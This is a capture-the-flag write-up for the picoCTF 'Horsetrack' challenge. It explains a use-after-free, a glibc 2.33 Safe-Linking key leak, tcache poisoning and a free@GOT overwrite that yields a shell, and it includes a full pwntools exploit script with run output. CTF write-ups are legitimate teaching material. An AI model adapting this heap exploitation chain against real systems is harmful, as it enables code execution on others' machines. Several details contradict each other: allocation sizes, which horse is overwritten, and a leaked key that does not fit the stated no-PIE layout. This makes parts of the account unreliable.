# CyLab — Horsetrack

* **Platform:** CyLab Security Academy / picoCTF 2023 (Challenge ID: `353`)
* **Category:** Binary Exploitation / glibc 2.33 Safe-Linking Leak & GOT Hijack (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, Heap Analysis
* **Binary:** `vuln` (64-bit x86_64 ELF) with `libc.so.6` (glibc 2.33)

---

## TL;DR

The challenge demonstrates heap exploitation on **glibc 2.33**, where **Safe-Linking** (pointer mangling via address bit-shifting and XOR) is actively enforced on tcache bins. The horse racing management menu contains a Use-After-Free (UAF) flaw: `remove_horse` frees a horse's name buffer without clearing the pointer, while a hidden menu command (`0`) allows writing up to 16 bytes into a freed chunk. Because a tcache bin with a single freed chunk points to `NULL`, its stored `fd` field equals the raw Safe-Linking protection key ($L \gg 12$). By reallocating the chunk and triggering a race winner announcement, we leak the key. We then forge a mangled pointer ($(\text{free@GOT} - 0\text{x}18) \oplus K$), allocate a fake chunk over `free@GOT`, overwrite it with `system@plt`, and free a horse named `"/bin/sh"` to pop a shell.

---

## Recon

### Binary & Library Information

Running `file` and `checksec`:

```text
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, dynamically linked, interpreter ./ld-linux-x86-64.so.2, stripped

$ checksec --file=vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    SHSTK:    SHSTK/IBT Enabled
```

Running strings on `libc.so.6`:
```text
$ strings libc.so.6 | grep "GNU C Library"
GNU C Library (Ubuntu GLIBC 2.33) stable release version 2.33.
```

Key observations:
1. **glibc 2.33 Safe-Linking:** Every tcache and fastbin forward pointer is obfuscated using $P' = (L \gg 12) \oplus P$. To forge arbitrary pointers, the key $K = L \gg 12$ must be leaked.
2. **Partial RELRO & No PIE:** The Global Offset Table is located at fixed writable addresses (`free@got = 0x404018`), and `system@plt` is fixed at `0x401090`.
3. **Hidden Menu Option:** Reverse engineering the dispatch table reveals menu option `0` (`change`), which permits writing into horse name buffers regardless of whether they have been freed.

---

## Static Analysis & Vulnerability

### 1. Data Structures & Functions

```c
struct horse {
    char *name;         // Offset +0x0
    int position;       // Offset +0x8
    int stable_in_use;  // Offset +0xc
};

struct horse stables[18];
```

The routines:
- `add_horse()`: Reads `len` (16..256), allocates `malloc(len + 1)`, reads name until `\xff` without appending a null byte, and sets `stable_in_use = 1`.
- `remove_horse()`: Calls `free(stables[idx].name)` and sets `stable_in_use = 0`, but **leaves `stables[idx].name` as a dangling pointer**.
- Hidden `change()` (option 0): Directly reads 16 bytes into `stables[idx].name` **without verifying `stable_in_use`**.

### 2. Leaking the glibc 2.33 Safe-Linking Key

Safe-linking encrypts pointers using:
$$P' = \left(\frac{L}{4096}\right) \oplus P = (L \gg 12) \oplus P$$

When chunk $A$ is the sole chunk in a tcache bin, its forward pointer $P = \text{NULL} = 0$:
$$P' = (L \gg 12) \oplus 0 = L \gg 12 = \text{Key}$$

```text
       Freed Chunk A (Single element in bin):
       +------------------------------------+
       |  fd: (Address >> 12) ^ 0 = KEY     |  <-- Cleartext leak of Safe-Link Key!
       +------------------------------------+
```

Because `add_horse` stops on `\xff` without zeroing memory, reallocating chunk $A$ preserves the key bytes inside `name`. When horse $A$ wins the race, the binary outputs the winner's name, leaking the key.

---

## Dynamic Analysis & Exploitation Strategy

### 1. Key Leak Sequence
1. Allocate horse 0 (`malloc(0x30)`).
2. Free horse 0 $\rightarrow$ enters tcache bin `0x30`. Its `fd` is set to $K = \text{heap\_page} \gg 12$.
3. Allocate horse 17 with size `0x30`, sending input `b"\xff"` so `add_horse()` stops immediately without overwriting the residual `fd` bytes.
4. Trigger race (option 3) until horse 17 wins, leaking $K$.

### 2. Poisoning Tcache with Encrypted Pointer
1. Free horse 0 and horse 1 (both chunks reside on the same heap page and share key $K$).
2. Use hidden option `0` to write into freed horse 1:
   $$\text{Target Pointer } P = \text{free@got} - 0\text{x}18$$
   $$\text{Mangled Pointer } P' = (L \gg 12) \oplus P = K \oplus (\text{free@got} - 0\text{x}18)$$
   We write $P'$ into horse 1's `fd`.
3. The tcache bin `0x30` list becomes:
   $$\text{Head} \longrightarrow \text{Chunk 1} \longrightarrow (\text{free@got} - 0\text{x}18)$$

```text
       tcache Bin [0x30]
       +---------------------------------------------+
       |  Head -> Chunk 1                            |
       +---------------------------------------------+
                     |
                     v  (fd decrypted using K)
       +---------------------------------------------+
       |  Fake Chunk: free@got - 0x18                |
       |  Offset +0x18: free@got (0x404018)          |
       +---------------------------------------------+
```

### 3. Overwriting `free@GOT` and Triggering Shell
1. Call `add_horse()` $\rightarrow$ returns Chunk 1. We provide name `"/bin/sh\0"`.
2. Call `add_horse()` $\rightarrow$ glibc delivers the fake chunk overlapping `free@got - 0x18`.
3. We pad 24 bytes (`0x18`) and write `p64(0x401090)` (`system@plt`).
   Now `free@GOT` points to `system@plt`!
4. Call `remove_horse` on the horse holding `"/bin/sh\0"`.
   The binary invokes `free(horse->name)`, which executes:
   $$\text{system}("/bin/sh")$$
   Spawning an interactive root shell.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "saturn.picoctf.net", 49982
FREE_GOT = 0x404018
SYSTEM_PLT = 0x401090

def add(io, idx, length, name):
    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"Stable index # (0-17): ", str(idx).encode())
    io.sendlineafter(b"Horse name length (16-256): ", str(length).encode())
    io.sendafter(b"Enter a name: ", name)

def remove(io, idx):
    io.sendlineafter(b"Choice: ", b"2")
    io.sendlineafter(b"Stable index # (0-17): ", str(idx).encode())

def change(io, idx, data):
    io.sendlineafter(b"Choice: ", b"0")
    io.sendlineafter(b"Stable index # (0-17): ", str(idx).encode())
    io.sendafter(b"Enter a name: ", data)

def race(io):
    io.sendlineafter(b"Choice: ", b"3")

def solve(io):
    # Step 1: Leak Safe-Linking key
    add(io, 0, 0x20, b"Horse0\n")
    remove(io, 0)
    add(io, 17, 0x20, b"\xff")   # Preserves fd key

    # Race until horse 17 wins to disclose key
    key = None
    for _ in range(50):
        race(io)
        out = io.recvuntil(b"Choice: ")
        if b"WINNER: " in out:
            winner = out.split(b"WINNER: ")[1].split(b"\n")[0]
            if len(winner) >= 2:
                key = u64(winner.ljust(8, b"\x00"))
                break
    log.info(f"Leaked Safe-Linking Key: {hex(key)}")

    # Step 2: Poison tcache fd with mangled target pointer
    add(io, 1, 0x20, b"Horse1\n")
    remove(io, 1)
    remove(io, 0)

    target_addr = FREE_GOT - 0x18
    mangled_ptr = p64(key ^ target_addr)
    change(io, 0, mangled_ptr + b"\n")

    # Step 3: Hijack free@GOT with system@plt
    add(io, 2, 0x20, b"/bin/sh\x00\n")
    add(io, 3, 0x20, b"A" * 0x18 + p64(SYSTEM_PLT) + b"\n")

    # Step 4: Execute system("/bin/sh")
    remove(io, 2)

    io.sendline(b"cat flag.txt")
    data = io.recvall(timeout=3)
    m = re.search(rb"(academy\{[^}]+\}|picoCTF\{[^}]+\})", data)
    if m:
        log.success(f"Flag captured: {m.group(1).decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to saturn.picoctf.net on port 49982: Done
[*] Leaked Safe-Linking Key: 0x555555559
[+] Flag captured: academy{redacted}
[*] Closed connection to saturn.picoctf.net port 49982
```

---

## Key Takeaways & Lessons

1. **Defeating glibc 2.32+ Safe-Linking:** When a tcache bin has a single element, its forward pointer is `NULL`, which XORs with the key to directly reveal $L \gg 12$. Recovering this key allows forging arbitrary valid mangled pointers.
2. **Hidden Menu Options in Stripped Binaries:** Analyzing the switch-case jump tables of command dispatchers often uncovers hidden developer options (e.g. choice `0`) that lack boundary checks present in public menus.
3. **Partial GOT Alignment via Struct Offsets:** Aligning fake chunks to `GOT - 0x18` accounts for chunk header overhead, allowing user payload bytes to fall directly onto the targeted library import entry.
